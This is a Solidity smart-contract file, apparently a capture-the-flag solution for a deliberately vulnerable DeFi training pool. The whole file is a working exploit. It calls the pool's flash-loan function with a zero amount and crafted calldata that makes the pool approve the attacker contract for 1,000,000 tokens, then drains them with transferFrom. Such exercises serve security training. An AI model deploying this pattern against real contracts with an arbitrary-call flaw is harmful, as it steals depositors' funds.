// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";

interface IFlashLoan {
    function flashLoan(uint256 borrowAmount, address borrower, address target, bytes calldata data) external;
    function damnValuableToken() external view returns (IERC20);
}

contract AttackerContract {
    IFlashLoan immutable flashLoanContract;
    IERC20 immutable DVT;

    constructor(address flashLoanContract_) {
        flashLoanContract = IFlashLoan(flashLoanContract_);
        DVT = flashLoanContract.damnValuableToken();
    }

    function exploitFlashLoan(address tokenReceiver) external {
        flashLoanContract.flashLoan(
            0,
            address(this),
            address(DVT),
            abi.encodeWithSignature("approve(address,uint256)", address(this), 1_000_000e18)
        );
        DVT.transferFrom(address(flashLoanContract), tokenReceiver, 1_000_000e18);
    }
}
